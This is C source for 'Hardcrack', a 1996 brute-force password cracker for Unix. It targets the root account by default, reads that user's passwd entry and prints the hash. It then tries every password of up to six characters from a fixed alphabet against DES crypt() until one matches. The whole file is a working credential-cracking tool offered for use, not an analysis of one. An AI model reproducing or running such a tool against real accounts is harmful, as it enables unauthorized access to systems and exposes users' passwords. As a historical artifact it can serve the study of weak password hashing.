/*    Hardcrack - Unix Hardcore Password Hacker 
 *  written by Stefan Reinauer & Volker Poplawski
 *                 in Juli 1996
 *           stepan@home.culture.mipt.ru
 *               volkerp@stepnet.de
 */

#include <stdio.h>
#include <pwd.h>
#include <assert.h>
#include <signal.h>
#include <sys/times.h>

#include "deslib/des.h"

#define HZ ((double)CLK_TCK)

char user[256]="root";
char *zeichen="\0abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789";
int z1=0,z2=0,z3=0,z4=0,z5=0,z6=0;
long run=0;

void sig_done(int sig) {
  signal(SIGALRM,sig_done);
  run=0;
}

double Time_F(int s)
{
  double ret;
  static struct tms tstart,tend;
  if (s == 0) {
    times(&tstart);
    return(0);
  } else {
    times(&tend);
    ret=((double)(tend.tms_utime-tstart.tms_utime))/HZ;
    return((ret == 0.0)?1e-6:ret);
  }
}

void calc_speed(long done)
{
  double d;
  long count;

  printf("Calibrating speed  ...  \n");
  signal(SIGALRM,sig_done);
  alarm(10);
  Time_F(0);
  for (count=0,run=1;run;count++) crypt("testing1","ef");
  d=Time_F(1);
  d=((double)count)/d;

  printf("%12.2f crypts/sec \n",d);
  printf("%5.1fuS per crypt();\n",1.0e6/d);
  printf("%8.3f h already working \n",(done/d)/3600);
  printf("%8.3f h working if 5 letters \n",((992436543-done)/d)/3600);
}

void usage(void)
{
  printf("Summary of command-line options:\n\n");
  printf("  -h,-?                    : Print help\n");
  printf("  -v                       : Print version and exit\n");
  printf("  -l Username              : Name of the User\n\n");
  printf("  -s Startpassword         : begin with Password\n");
  printf("  -1 int                   : First letter has value int, 0<int<64. \n");
  printf("  -2,... -6 int            : The same for letter 2 to 6\n");
}

void parse_cmdline(int argc, char **argv)
{
  int c,j;
  extern char *optarg;
  char dummyp[256];  

  while(((c = getopt(argc, argv, "l:1:2:3:4:5:6:?hs:f:v")) != EOF)) switch(c) {
   case '?':
   case 'h': usage(); exit(0);
   case 'l': strncpy(user, optarg, 255); user[255] = 0;break;
   case '6': z6 = atoi(optarg); break;
   case '5': z5 = atoi(optarg); break;
   case '4': z4 = atoi(optarg); break;
   case '3': z3 = atoi(optarg); break;
   case '2': z2 = atoi(optarg); break;
   case '1': z1 = atoi(optarg); break;
   case 'f': printf ("Option -f not yet implemented. Using /etc/passwd\n\n"); break;
   case 'v': printf ("Hardcrack v0.2 96/07/04\n"); exit (0);
   case 's': strncpy(dummyp, optarg, 255); dummyp[255]=0;
             for (j=0; j<64; j++) if (dummyp[0]==zeichen[j]) z1=j;
             for (j=0; j<64; j++) if (dummyp[1]==zeichen[j]) z2=j;
             for (j=0; j<64; j++) if (dummyp[2]==zeichen[j]) z3=j;
             for (j=0; j<64; j++) if (dummyp[3]==zeichen[j]) z4=j;
             for (j=0; j<64; j++) if (dummyp[4]==zeichen[j]) z5=j;
             for (j=0; j<64; j++) if (dummyp[5]==zeichen[j]) z6=j;

  }
}

int main( int argc, char **argv ) {

 long times;
 char passw[8];
 char *salt;
 struct passwd *pw;

 printf ("Hardcrack 0.2 - THE UN*X HARDCORE PASSWORD CRACKER \n\n");

 parse_cmdline(argc,argv);

 if (z6>63) z6=63; if (z5>63) z5=63; if (z4>63) z4=63;
 if (z3>63) z3=63; if (z2>63) z2=63; if (z1>63) z1=63;

 if (z6>0 && z5==0) z5=1;
 if (z5>0 && z4==0) z4=1;
 if (z4>0 && z3==0) z3=1;
 if (z3>0 && z2==0) z2=1;
 if (z2>0 && z1==0) z1=1;
 
  if (z1>0) times=z1; else times=0;
  if (z2>0) times*=z2; if (z3>0) times*=z3;
  if (z4>0) times*=z4; if (z5>0) times*=z5;
  if (z6>0) times*=z6;

 calc_speed(times);

 pw = getpwnam(user);
 if (pw==NULL) { printf ("User '%s' does not exist!\n",user); exit (0); }

 salt = pw->pw_passwd; 

 printf("passwd-entry:\n%s:%s:%d:%d:%s:%s:%s\n\n",pw->pw_name,pw->pw_passwd,pw->pw_uid,pw->pw_gid,pw->pw_gecos,pw->pw_dir,pw->pw_shell);

 passw[0]=zeichen[z1];passw[1]=zeichen[z2];passw[2]=zeichen[z3];
 passw[3]=zeichen[z4];passw[4]=zeichen[z5];passw[5]=zeichen[z6];

 printf ("Start: %02d:%02d:%02d:%02d:%02d:%02d - '%s'\n\n",z1,z2,z3,z4,z5,z6,passw);

 goto jumpin;

 for ( z6=1; z6<64; z6++) 
  for ( z5=1; z5<64; z5++) 
   for ( z4=1; z4<64; z4++) {
    printf("'%s'\n",passw); 
    for ( z3=1; z3<64; z3++)
     for ( z2=1; z2<64; z2++)
      for ( z1=1; z1<64; z1++) {
jumpin:
       passw[0]=zeichen[z1];passw[1]=zeichen[z2];passw[2]=zeichen[z3];
       passw[3]=zeichen[z4];passw[4]=zeichen[z5];passw[5]=zeichen[z6];
       if ( strcmp(crypt( passw, salt ), salt ) == 0 ) {
        printf( "User '%s' has the password '%s'\n", pw->pw_name, passw );
        exit(0);
       } 
      } 
   }
 return 0;
}
